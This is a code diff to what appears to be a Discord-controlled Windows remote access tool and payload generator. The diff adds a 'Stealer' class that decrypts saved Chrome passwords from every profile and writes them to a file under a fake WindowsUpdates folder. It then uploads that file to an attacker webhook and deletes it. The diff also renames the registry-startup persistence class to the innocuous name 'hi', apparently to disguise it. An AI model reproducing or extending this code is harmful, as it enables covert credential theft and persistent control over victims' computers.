@@ -3,7 +3,6 @@
 
 import logging
 from rich.logging import RichHandler
-import time
 from src.file_encoder import *
 
 FORMAT = "%(message)s"
@@ -40,11 +39,11 @@ import psutil
 import json
 import winreg as reg
 
-class Persistence: 
+class hi: 
     def __init__(self):
         self.reg_name = reg_name
 
-    def add_to_startup_windows(self):
+    def adding(self):
         script_path = os.path.abspath(sys.argv[0])
 
         key = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -606,6 +605,7 @@ class Help:
                     "value": r'This will create a directory tree of a given file path you specify , ie: /tree -f "C:" this will create a directory tree of all directories found in the C Drive',
                     "inline": True
                 },
+
             ]
         }
         payload = {
@@ -824,6 +824,96 @@ class Crawler:
                 msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
                 msg_instance.msg()
 
+class Stealer: 
+    def __init__(self,webhook): 
+        self.webhook = webhook
+        self.CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+        self.CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+
+    def get_secret_key(self):
+        try:
+            with open( self.CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+                local_state = f.read()
+                local_state = json.loads(local_state)
+            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            secret_key = secret_key[5:] 
+            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+            return secret_key
+        except Exception as e:
+            print("%s"%str(e))
+            print("[ERR] Chrome secretkey cannot be found")
+            return None
+    
+    def decrypt_payload(self,cipher, payload):
+        return cipher.decrypt(payload)
+    
+    def generate_cipher(self,aes_key, iv):
+        return AES.new(aes_key, AES.MODE_GCM, iv)
+
+    def decrypt_password(self, ciphertext, secret_key):
+        try:
+            initialisation_vector = ciphertext[3:15]
+            encrypted_password = ciphertext[15:-16]
+            cipher = self.generate_cipher(secret_key, initialisation_vector)
+            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
+            decrypted_pass = decrypted_pass.decode()  
+            return decrypted_pass
+        except Exception as e:
+            print("%s"%str(e))
+            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
+            return ""
+    
+
+    def get_db_connection(self,chrome_path_login_db):
+        try:
+            print(chrome_path_login_db)
+            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
+            return sqlite3.connect("Loginvault.db")
+        except Exception as e:
+            print("%s"%str(e))
+            print("[ERR] Chrome database cannot be found")
+            return None
+
+    def attempt(self):
+        try:
+            dir = r'C:\ProgramData\WindowsUpdates\data.csv'
+            try:
+                os.makedirs(os.path.dirname(dir), exist_ok=True)
+                with open(dir, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+                    csv_writer = csv.writer(decrypt_password_file, delimiter=',')
+                    csv_writer.writerow(["index","url","username","password"])
+                    secret_key = self.get_secret_key()
+                    folders = [element for element in os.listdir(self.CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
+                    for folder in folders:
+                        chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(self.CHROME_PATH,folder))
+                        conn = self.get_db_connection(chrome_path_login_db)
+                        if(secret_key and conn):
+                            cursor = conn.cursor()
+                            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                            for index,login in enumerate(cursor.fetchall()):
+                                url = login[0]
+                                username = login[1]
+                                ciphertext = login[2]
+                                if(url!="" and username!="" and ciphertext!=""):
+                                    decrypted_password = self.decrypt_password(ciphertext, secret_key)
+                                    csv_writer.writerow([index,url,username,decrypted_password])
+                            cursor.close()
+                            conn.close()
+                            os.remove("Loginvault.db")
+                upload = Upload_files(file_path=dir, webhook_url=self.webhook)
+                upload.webhook_upload()
+                try: 
+                    os.remove(dir)
+                except Exception as e: 
+                    msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
+                    msg_instance.msg()
+            except Exception as e: 
+                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
+                msg_instance.msg()
+        except Exception as e:
+                msg_instance = System_Messages(webhook_url=self.webhook_url,error=True,headers=None,payload=None,message=str(e),is_msg=False)
+                msg_instance.msg()
+                
 class Process: 
     def __init__(self,command,webhook_url):
         self.command = command
@@ -887,6 +977,7 @@ class Process:
             parse_input = Parser(command_line=command_line,func=func,webhook_url=self.webhook_url)
             parse_input.parse_input()
 
+
             '''
             code2 = r'''
 Token = "{}"
@@ -894,13 +985,13 @@ Server_id = "{}"
 reg_name = "WindowsSecurity"
 output_folder = "/Documents/zeon/hunter/doom/regular"
 
-persistence_instance = Persistence()
+persistence_instance = hi()
 system_gen_instance = System_gen()
 
 
 def main():
     last_message_id = None
-    persistence_instance.add_to_startup_windows()
+    persistence_instance.adding()
     webhook,channel_id = system_gen_instance.create_channel_webhook()
     messages_instance = Messages(channel_id)
     while True: 
@@ -921,9 +1012,6 @@ main()'''.format(self.token,self.Server_id)
             print(f"{str(e)}")
 
         log.info("Payload Generation Complete!")
-
-        time.sleep(2)
-
         log.info("Begining To write Payload to file!")
         try:
             name = 'payload.py'
